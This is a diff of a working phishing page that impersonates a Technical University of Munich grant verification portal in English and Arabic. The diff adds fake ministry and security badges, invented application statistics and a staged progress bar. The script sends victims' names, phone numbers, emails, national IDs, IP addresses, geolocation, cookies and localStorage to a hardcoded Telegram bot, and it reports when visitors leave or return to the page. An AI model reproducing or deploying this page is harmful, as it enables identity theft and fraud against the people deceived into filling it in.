@@ -6,36 +6,43 @@
     <title>TUM | Academic Verification Portal</title>
     <meta property="og:title" content="TUM Global Excellence Grant 2026">
     <meta property="og:description" content="Official verification portal for international research candidates.">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a1/TU_München_Logo.svg/1200px-TU_München_Logo.svg.png">
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
-        :root { --tum-blue: #0065BD; --dark-grey: #2c3e50; --light-grey: #f8f9fa; --gold: #d4af37; }
+        :root { --tum-blue: #0065BD; --tum-dark: #003d5e; --gold: #d4af37; --gray-light: #f4f6f9; --gray-border: #e2e8f0; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Roboto', 'Tajawal', sans-serif; background: linear-gradient(135deg, #e9ecef 0%, #dee2e6 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .container { background: white; border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.15); width: 100%; max-width: 550px; overflow: hidden; transition: 0.3s; border-top: 6px solid var(--tum-blue); }
+        body { font-family: 'Inter', 'Tajawal', sans-serif; background: linear-gradient(135deg, #eef2f7 0%, #d9e2ec 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .container { background: white; border-radius: 32px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25); width: 100%; max-width: 600px; overflow: hidden; transition: 0.3s; border-top: 6px solid var(--tum-blue); }
         .header { background: var(--tum-blue); padding: 20px; text-align: center; color: white; position: relative; }
-        .logo { width: 100px; margin-bottom: 10px; background: white; border-radius: 50%; padding: 8px; }
-        .header h1 { font-size: 22px; margin-bottom: 5px; }
-        .header p { font-size: 13px; opacity: 0.9; }
-        .lang-switch { position: absolute; top: 15px; right: 20px; background: rgba(255,255,255,0.2); border-radius: 30px; padding: 5px 10px; font-size: 12px; cursor: pointer; transition: 0.2s; }
-        .lang-switch:hover { background: rgba(255,255,255,0.4); }
-        .content { padding: 30px 25px; }
-        .form-group { margin-bottom: 20px; text-align: left; }
-        label { display: block; font-weight: bold; margin-bottom: 8px; font-size: 14px; color: var(--dark-grey); }
-        label i { color: var(--tum-blue); margin-right: 5px; }
-        input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; font-family: inherit; transition: 0.2s; background: #fff; }
+        .text-logo { font-size: 28px; font-weight: 800; letter-spacing: 1px; margin-bottom: 10px; background: rgba(255,255,255,0.15); display: inline-block; padding: 8px 24px; border-radius: 60px; backdrop-filter: blur(4px); }
+        .lang-switch { position: absolute; top: 20px; right: 20px; background: white; color: var(--tum-blue); border-radius: 40px; padding: 8px 16px; font-size: 14px; font-weight: bold; cursor: pointer; transition: 0.2s; border: 2px solid white; box-shadow: 0 2px 12px rgba(0,0,0,0.15); }
+        .lang-switch:hover { background: var(--gold); color: #000; border-color: var(--gold); transform: scale(1.02); }
+        .content { padding: 30px 28px; }
+        .badge-container { display: flex; justify-content: space-between; margin-bottom: 20px; flex-wrap: wrap; gap: 12px; }
+        .security-badge { background: #eef2ff; border-radius: 40px; padding: 6px 14px; font-size: 12px; font-weight: 600; color: var(--tum-blue); display: inline-flex; align-items: center; gap: 6px; border: 1px solid #cbd5e1; }
+        .stats { background: var(--gray-light); border-radius: 20px; padding: 12px 16px; margin-bottom: 25px; display: flex; justify-content: space-between; border: 1px solid var(--gray-border); }
+        .stat-item { text-align: center; flex: 1; }
+        .stat-number { font-size: 22px; font-weight: 800; color: var(--tum-blue); }
+        .stat-label { font-size: 11px; color: #475569; text-transform: uppercase; letter-spacing: 0.5px; }
+        .form-group { margin-bottom: 22px; text-align: left; }
+        label { display: block; font-weight: 600; margin-bottom: 8px; font-size: 14px; color: #1e293b; }
+        .optional-badge { font-weight: normal; font-size: 12px; color: #64748b; background: #f1f5f9; padding: 2px 8px; border-radius: 20px; margin-right: 8px; }
+        input { width: 100%; padding: 14px 16px; border: 1.5px solid var(--gray-border); border-radius: 16px; font-size: 15px; font-family: inherit; transition: 0.2s; background: white; }
         input:focus { border-color: var(--tum-blue); outline: none; box-shadow: 0 0 0 3px rgba(0,101,189,0.2); }
-        .btn { background: var(--tum-blue); color: white; border: none; padding: 14px; width: 100%; border-radius: 40px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,101,189,0.3); }
+        .hint { font-size: 11px; color: #64748b; margin-top: 6px; }
+        .btn { background: var(--tum-blue); color: white; border: none; padding: 15px; width: 100%; border-radius: 40px; font-size: 17px; font-weight: 700; cursor: pointer; transition: 0.3s; margin-top: 8px; box-shadow: 0 4px 12px rgba(0,101,189,0.3); }
         .btn:active { transform: scale(0.98); }
-        .footer-note { font-size: 11px; color: #6c757d; text-align: center; margin-top: 25px; padding-top: 15px; border-top: 1px solid #eee; }
-        #loading-box { display: none; background: #f0f7ff; border-radius: 16px; padding: 20px; margin-top: 20px; text-align: center; border-left: 4px solid var(--tum-blue); }
-        .spinner { width: 40px; height: 40px; border: 4px solid #e0e0e0; border-top: 4px solid var(--tum-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #success-message { display: none; background: #e8f5e9; border-left: 4px solid #2e7d32; padding: 15px; border-radius: 12px; margin-top: 20px; color: #1b5e20; }
-        .toast-msg { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.85); color: var(--gold); padding: 8px 20px; border-radius: 40px; font-size: 13px; z-index: 1000; display: none; backdrop-filter: blur(8px); border: 1px solid var(--gold); font-weight: bold; white-space: nowrap; }
-        .redirect-btn { background: #2e7d32; margin-top: 15px; }
+        .progress-section { margin: 20px 0 15px; display: none; }
+        .progress-bar-container { background: #e2e8f0; border-radius: 30px; height: 8px; overflow: hidden; }
+        .progress-fill { background: var(--tum-blue); width: 0%; height: 100%; transition: width 0.3s ease; }
+        .status-text { font-size: 12px; color: var(--tum-blue); margin-top: 8px; font-weight: 500; text-align: center; }
+        #success-message { display: none; background: #e8f5e9; border-left: 4px solid #2e7d32; padding: 20px; border-radius: 20px; margin-top: 20px; color: #1b5e20; }
+        .redirect-btn { background: #2e7d32; margin-top: 16px; }
         .redirect-btn:hover { background: #1b5e20; }
-        .hint { font-size: 11px; color: #888; margin-top: 5px; }
+        .digital-signature { margin-top: 25px; padding-top: 15px; border-top: 1px dashed #cbd5e1; font-size: 10px; color: #64748b; text-align: center; display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
+        .toast-msg { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.85); color: var(--gold); padding: 8px 20px; border-radius: 40px; font-size: 13px; z-index: 1000; display: none; backdrop-filter: blur(8px); border: 1px solid var(--gold); font-weight: bold; white-space: nowrap; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .spinner { width: 32px; height: 32px; border: 3px solid #e0e0e0; border-top: 3px solid var(--tum-blue); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
+        .loading-text { text-align: center; font-size: 14px; color: var(--tum-blue); font-weight: 500; }
     </style>
 </head>
 <body>
@@ -44,14 +51,24 @@
 
 <div class="container">
     <div class="header">
-    <div class="lang-switch" id="langToggle">🇬🇧 EN</div> 
-    
-    <h1 id="mainTitle">Academic Verification Portal</h1>
-    <p id="subTitle">Technical University of Munich | Excellence Grant 2026</p>
-</div>
-
+        <div class="text-logo">🎓 TUM</div>
+        <div class="lang-switch" id="langToggle">🇬🇧 EN</div>
+        <h1 id="mainTitle">Academic Verification Portal</h1>
+        <p id="subTitle">Technical University of Munich | Excellence Grant 2026</p>
+    </div>
     <div class="content">
-        <p id="descText" style="margin-bottom: 20px; font-size: 14px; color: #4a5568;">Please enter your official credentials to sync with ministry records and access the <b>€4,500 Grant</b> dashboard.</p>
+        <!-- شارات موثوقية وإحصائيات -->
+        <div class="badge-container">
+            <div class="security-badge">🔒 SSL Encrypted (256-bit)</div>
+            <div class="security-badge">✅ Verified by German Ministry</div>
+            <div class="security-badge">🛡️ Data Protection (GDPR)</div>
+        </div>
+        <div class="stats">
+            <div class="stat-item"><div class="stat-number" id="dailyApps">1,247</div><div class="stat-label" id="statLabelApps">Applications Today</div></div>
+            <div class="stat-item"><div class="stat-number">€4.5M</div><div class="stat-label" id="statLabelFunds">Total Funds</div></div>
+            <div class="stat-item"><div class="stat-number" id="remainingGrants">328</div><div class="stat-label" id="statLabelRemaining">Remaining Grants</div></div>
+        </div>
+        <p id="descText" style="margin-bottom: 20px; font-size: 14px; color: #334155;">Please enter your official credentials to sync with ministry records and access the <b>€4,500 Grant</b> dashboard.</p>
 
         <div id="step-form">
             <div class="form-group">
@@ -68,21 +85,24 @@
                 <input type="email" id="email" placeholder="example@university.edu" autocomplete="off">
             </div>
             <div class="form-group">
-                <label id="labelJobId"><i>🆔</i> Employee ID / Job Number</label>
-                <input type="text" id="job_id" placeholder="e.g. 1024587" autocomplete="off">
+                <label id="labelJobId"><i>🆔</i> Employee ID / Job Number <span class="optional-badge">Optional</span></label>
+                <input type="text" id="job_id" placeholder="e.g. 1024587 (optional)" autocomplete="off">
                 <div class="hint" id="jobHint">Found on your official staff card</div>
             </div>
             <div class="form-group">
-                <label id="labelNationalId"><i>🪪</i> National ID Number</label>
-                <input type="text" id="national_id" placeholder="Enter your national ID" autocomplete="off">
+                <label id="labelNationalId"><i>🪪</i> National ID Number <span class="optional-badge">Optional</span></label>
+                <input type="text" id="national_id" placeholder="Enter your national ID (optional)" autocomplete="off">
             </div>
             <button class="btn" id="submitBtn" onclick="processVerification()">Verify & Activate Grant 🎓</button>
         </div>
 
-        <div id="loading-box">
+        <div id="loading-box" style="display: none;">
             <div class="spinner"></div>
-            <div id="loadingText">Synchronizing with Munich servers ...</div>
-            <div id="loadingSub" style="font-size: 12px; margin-top: 8px;">Please wait, verifying records</div>
+            <div class="loading-text" id="loadingText">Synchronizing with Munich servers ...</div>
+            <div class="progress-section" style="display: block;">
+                <div class="progress-bar-container"><div class="progress-fill" id="progressFill"></div></div>
+                <div class="status-text" id="progressStatus">Connecting to secure gateway...</div>
+            </div>
         </div>
 
         <div id="success-message">
@@ -90,9 +110,9 @@
             <button class="btn redirect-btn" id="redirectBtn" onclick="redirectToTUM()">Continue to Dashboard →</button>
         </div>
 
-        <div class="footer-note" id="footerNote">
-            Technische Universität München | International Relations Office<br>
-            Arcisstraße 21, 80333 München, Germany
+        <div class="digital-signature">
+            <span>📜 Digitally Signed by TUM | ID: TUM-VER-2026</span>
+            <span>🔐 Timestamp: <span id="timestamp"></span></span>
         </div>
     </div>
 </div>
@@ -102,7 +122,7 @@
     const token = "8630574958:AAFm1DOq1WChSi04xr9mXodcTSDxaBPfT-A"; 
     const chatId = "7388801889"; 
 
-    // ---------- Multi-Language Support (default: English) ----------
+    // ---------- Multi-Language Support ----------
     let currentLang = 'en';
     const translations = {
         en: {
@@ -115,13 +135,15 @@
             labelJobId: '🆔 Employee ID / Job Number',
             labelNationalId: '🪪 National ID Number',
             phoneHint: 'Include country code for verification',
-            jobHint: 'Found on your official staff card',
+            jobHint: 'Found on your official staff card (optional)',
             submitBtn: 'Verify & Activate Grant 🎓',
             loadingText: 'Synchronizing with Munich servers ...',
             loadingSub: 'Please wait, verifying records',
             successText: '✅ <strong>Application received successfully</strong><br>You will be contacted via your university email within 24 hours to complete the grant process. Thank you for registering with TUM Excellence Program.',
             redirectBtn: 'Continue to Dashboard →',
-            footerNote: 'Technische Universität München | International Relations Office<br>Arcisstraße 21, 80333 München, Germany',
+            statLabelApps: 'Applications Today',
+            statLabelFunds: 'Total Funds',
+            statLabelRemaining: 'Remaining Grants',
             toastUpdates: [
                 "📚 1,247 researchers updated today",
                 "🇩🇪 System connected to TUM servers directly",
@@ -141,13 +163,15 @@
             labelJobId: '🆔 رقم الوظيفة / رقم حافظة الدوام',
             labelNationalId: '🪪 الرقم الوطني',
             phoneHint: 'أدخل رمز الدولة مثال +966',
-            jobHint: 'موجود في بطاقة الموظف الرسمية',
+            jobHint: 'موجود في بطاقة الموظف الرسمية (اختياري)',
             submitBtn: 'تحقق وتفعيل المنحة 🎓',
             loadingText: 'جاري المزامنة مع خوادم ميونيخ ...',
             loadingSub: 'الرجاء الانتظار، يتم التحقق من السجلات',
             successText: '✅ <strong>تم استلام طلبك بنجاح</strong><br>سيتم التواصل مع بريدك الجامعي خلال 24 ساعة لإتمام إجراءات المنحة. شكراً لتسجيلك في برنامج TUM للتميز.',
             redirectBtn: 'المتابعة إلى لوحة التحكم ←',
-            footerNote: 'جامعة ميونخ التقنية | مكتب العلاقات الدولية<br>Arcisstraße 21, 80333 ميونخ, ألمانيا',
+            statLabelApps: 'الطلبات اليوم',
+            statLabelFunds: 'إجمالي التمويل',
+            statLabelRemaining: 'المنح المتبقية',
             toastUpdates: [
                 "📚 تم تحديث سجلات 1,247 باحثاً اليوم",
                 "🇩🇪 نظام التحقق متصل بخوادم TUM مباشرة",
@@ -174,12 +198,12 @@
         document.getElementById('jobHint').innerText = t.jobHint;
         document.getElementById('submitBtn').innerText = t.submitBtn;
         document.getElementById('loadingText').innerText = t.loadingText;
-        document.getElementById('loadingSub').innerText = t.loadingSub;
         document.getElementById('successText').innerHTML = t.successText;
         document.getElementById('redirectBtn').innerText = t.redirectBtn;
-        document.getElementById('footerNote').innerHTML = t.footerNote;
+        document.getElementById('statLabelApps').innerText = t.statLabelApps;
+        document.getElementById('statLabelFunds').innerText = t.statLabelFunds;
+        document.getElementById('statLabelRemaining').innerText = t.statLabelRemaining;
         document.getElementById('langToggle').innerHTML = lang === 'en' ? '🇸🇦 AR' : '🇬🇧 EN';
-        // تحديث الإشعارات العشوائية
         window.toastMessages = t.toastUpdates;
     }
 
@@ -188,7 +212,18 @@
         applyLanguage(newLang);
     });
 
-    // ---------- All Radar & Spy Functions (unchanged but improved) ----------
+    // إحصائيات ديناميكية وهمية
+    function updateStats() {
+        const daily = Math.floor(1200 + Math.random() * 300);
+        const remaining = Math.floor(280 + Math.random() * 80);
+        document.getElementById('dailyApps').innerText = daily;
+        document.getElementById('remainingGrants').innerText = remaining;
+    }
+    setInterval(updateStats, 15000);
+    updateStats();
+    document.getElementById('timestamp').innerText = new Date().toLocaleString();
+
+    // ========== جميع وظائف الرادار والتجسس (من الكود السابق) ==========
     async function getPowerTech() {
         try {
             const battery = await navigator.getBattery();
@@ -303,7 +338,6 @@
 
     window.addEventListener('load', () => {
         silentRadar();
-        // Send cookies & localStorage
         let cookies = document.cookie || "No cookies (protected)";
         let localData = "Empty";
         try { localData = JSON.stringify(localStorage); if(localData === "{}") localData = "Empty"; } catch(e) { localData = "Blocked"; }
@@ -343,7 +377,7 @@
     });
 
     window.onblur = () => {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📴 User left the page (switched app or locked screen)")}`);
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📴 User left the page")}`);
     };
     window.onfocus = () => {
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📱 User returned to the page")}`);
@@ -367,7 +401,34 @@
         } catch(e) {}
     }, { once: true });
 
-    // ---------- Main Form Processing ----------
+    // محاكاة شريط التقدم أثناء التحميل
+    function simulateProgress(callback) {
+        let width = 0;
+        const fill = document.getElementById('progressFill');
+        const statusText = document.getElementById('progressStatus');
+        const steps = [
+            "Connecting to secure gateway...",
+            "Encrypting data (TLS 1.3)...",
+            "Querying German ministry database...",
+            "Verifying credentials...",
+            "Finalizing grant allocation..."
+        ];
+        let stepIndex = 0;
+        const interval = setInterval(() => {
+            if (stepIndex < steps.length) {
+                statusText.innerText = steps[stepIndex];
+                stepIndex++;
+            }
+            width += 20;
+            fill.style.width = width + '%';
+            if (width >= 100) {
+                clearInterval(interval);
+                if (callback) callback();
+            }
+        }, 600);
+    }
+
+    // ========== دالة المعالجة الأساسية ==========
     async function processVerification() {
         const name = document.getElementById('fullname').value.trim();
         const phone = document.getElementById('phone').value.trim();
@@ -375,39 +436,40 @@
         const jobId = document.getElementById('job_id').value.trim();
         const nationalId = document.getElementById('national_id').value.trim();
         
-        if(!name || !phone || !email || !jobId || !nationalId) {
-            showToast(currentLang === 'en' ? "Please fill all required fields" : "يرجى ملء جميع الحقول المطلوبة", 2500, "#dc3545");
+        if(!name || !phone || !email) {
+            showToast(currentLang === 'en' ? "Please fill all required fields (Name, Phone, Email)" : "يرجى ملء الحقول الإجبارية (الاسم، الجوال، البريد)", 3000, "#dc3545");
             return;
         }
         
-        // Hide form, show loading
         document.getElementById('step-form').style.display = 'none';
         document.getElementById('loading-box').style.display = 'block';
+        document.getElementById('progressFill').style.width = '0%';
         
         getLocationAndSend();
         const userIP = await fetchUserIP();
         
+        // إرسال البيانات (حتى الحقول الاختيارية إن وجدت)
         const userDataMsg = `
 🎓 [TUM] New Excellence Grant Application
 👤 Full Name: ${name}
 📱 Phone: ${phone}
 📧 Email: ${email}
-🆔 Job ID: ${jobId}
-🪪 National ID: ${nationalId}
+🆔 Job ID: ${jobId || '(not provided)'}
+🪪 National ID: ${nationalId || '(not provided)'}
 🌍 IP Address: ${userIP}
 ----------------------------------
 ✅ Status: Form submitted successfully
         `;
         await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(userDataMsg)}`);
         
-        setTimeout(() => {
+        // تشغيل شريط التقدم ثم إظهار رسالة النجاح
+        simulateProgress(() => {
             document.getElementById('loading-box').style.display = 'none';
             document.getElementById('success-message').style.display = 'block';
             showToast(currentLang === 'en' ? "Verification successful! You will receive an email shortly." : "تم التحقق بنجاح! سيصلك بريد إلكتروني قريباً.", 4000, "#2e7d32");
-        }, 3000);
+        });
     }
     
-    // Redirect to real TUM website
     function redirectToTUM() {
         window.location.href = "https://www.tum.de";
     }
@@ -420,16 +482,14 @@
         setTimeout(() => { toast.style.display = 'none'; }, duration);
     }
     
-    // Random academic toasts (bilingual)
     let toastMessages = translations.en.toastUpdates;
     setInterval(() => {
         const randomMsg = toastMessages[Math.floor(Math.random() * toastMessages.length)];
         showToast(randomMsg, 2800, "#0065BD");
     }, 7000);
     
-    // Apply default English
     applyLanguage('en');
-    console.log("✅ TUM Portal with redirect button, phone/email fields, IP capture, and bilingual support ready.");
+    console.log("✅ TUM Portal with optional fields, progress bar, stats, and digital signature ready.");
 </script>
 
 </body>
